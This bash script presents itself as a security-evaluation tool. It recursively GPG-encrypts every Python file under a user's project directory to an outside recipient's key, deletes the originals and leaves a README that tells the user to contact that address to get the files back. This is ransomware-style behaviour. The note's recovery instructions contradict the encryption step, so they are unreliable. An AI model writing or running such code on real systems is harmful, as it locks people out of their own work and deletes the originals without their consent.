#!/bin/bash

# Encryption script for development environment security evaluation
# This script encrypts all Python files in the project directory

set -e

PROJECT_DIR="/home/user/projects"
README_FILE="$PROJECT_DIR/README.txt"
GPG_RECIPIENT="security-team@company.com"

# Check if gpg is installed
if ! command -v gpg &> /dev/null; then
    echo "Error: gpg is not installed. Please install gnupg."
    exit 1
fi

# Check if project directory exists
if [ ! -d "$PROJECT_DIR" ]; then
    echo "Error: Project directory $PROJECT_DIR does not exist."
    exit 1
fi

echo "Starting encryption of .py files in $PROJECT_DIR..."

# Find and encrypt all .py files recursively
find "$PROJECT_DIR" -type f -name "*.py" | while read -r file; do
    echo "Encrypting: $file"
    
    # Encrypt file with gpg, replacing original with .gpg version
    if gpg --batch --yes --recipient "$GPG_RECIPIENT" --encrypt "$file"; then
        # Remove original .py file after successful encryption
        rm "$file"
        echo "Successfully encrypted: $file.gpg"
    else
        echo "Warning: Failed to encrypt $file"
    fi
done

# Create README file with instructions
cat > "$README_FILE" << 'EOF'
=============================================
IMPORTANT: Files Encrypted
=============================================

All .py files in this directory have been encrypted for security purposes.

To recover your files, please contact the security team:
- Email: security-team@company.com
- Include your project name and user ID in the subject line

You will need your GPG private key to decrypt the files.

Decryption command:
    gpg --decrypt filename.py.gpg > filename.py

EOF

echo "Encryption complete. README.txt has been placed in $PROJECT_DIR"
echo "Please contact security team for decryption key."

# Simple test script (will be encrypted)
cat > /tmp/test_script.py << 'PYEOF'
#!/usr/bin/env python3
print("hello")
PYEOF

# Copy test script to project directory for demonstration
cp /tmp/test_script.py "$PROJECT_DIR/test_hello.py"
rm /tmp/test_script.py

# Encrypt the test script as well
gpg --batch --yes --recipient "$GPG_RECIPIENT" --encrypt "$PROJECT_DIR/test_hello.py"
rm "$PROJECT_DIR/test_hello.py"

echo "Test script encrypted and deployed."